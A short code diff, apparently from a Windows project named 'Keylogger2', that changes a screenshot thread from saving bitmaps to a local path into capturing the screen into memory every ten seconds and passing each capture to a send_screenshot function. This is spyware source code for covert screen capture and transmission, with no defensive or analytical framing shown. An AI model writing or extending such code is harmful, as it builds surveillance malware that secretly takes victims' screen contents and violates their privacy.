@@ -11,14 +11,21 @@
 
 // Thread function for capturing screenshots
 DWORD WINAPI screenshot_thread(LPVOID lpParam) {
-    WCHAR filePath[] = L"C:\\Users\\kolby\\source\\repos\\KolbySnider\\Keylogger2\\out\\build\\x64-release\\screenshot.bmp";
-
     while (true) {
-        save_bitmap(filePath); // Capture and save the screenshot
-        Sleep(10000);         // Sleep for 10 seconds (10000 milliseconds)
+        // Capture the screenshot into a memory buffer (BMP format)
+        std::vector<char> bmpData = capture_screenshot();
+        if (!bmpData.empty()) {
+            bool sent = send_screenshot(bmpData);
+            // Optionally, log or print the status
+            if (sent) {
+                OutputDebugStringA("Screenshot sent successfully.\n");
+            } else {
+                OutputDebugStringA("Failed to send screenshot.\n");
+            }
+        }
+        // Wait for 10 seconds before capturing again
+        std::this_thread::sleep_for(std::chrono::seconds(10));
     }
-
-    return 0;
 }
 
 DWORD WINAPI detect_process_thread(LPVOID lpParam) {
